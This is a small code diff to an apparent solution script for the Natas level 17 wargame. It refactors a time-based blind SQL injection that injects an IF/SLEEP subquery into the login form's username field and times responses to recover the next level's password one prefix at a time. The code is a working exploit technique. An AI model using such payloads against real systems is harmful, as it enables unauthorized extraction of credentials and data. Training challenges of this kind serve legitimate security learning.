@@ -7,16 +7,17 @@ session, url = natas_session(17)
 
 
 def long_response_time(password_prefix: str) -> bool:
+    delay_time = 1
     start_time = time.perf_counter()
     query = f"""(SELECT COUNT(*) from users WHERE username="natas18" AND BINARY password LIKE '{password_prefix}%')"""
     payload = {
-        "username": f"""natas18" AND IF({query} > 0, SLEEP(1), 'anything') -- """,
+        "username": f"""natas18" AND IF({query} > 0, SLEEP({delay_time}), 'anything') -- """,
         "submit": "Login",
     }
     session.post(url + "/index.php", data=payload)
     end_time = time.perf_counter()
     # print(f"Prefix: {password_prefix} took {et - st:.2f} seconds")
-    return (end_time - start_time) > 1
+    return (end_time - start_time) > delay_time
 
 
 POSSIBLE_CHARS = string.ascii_letters + string.digits
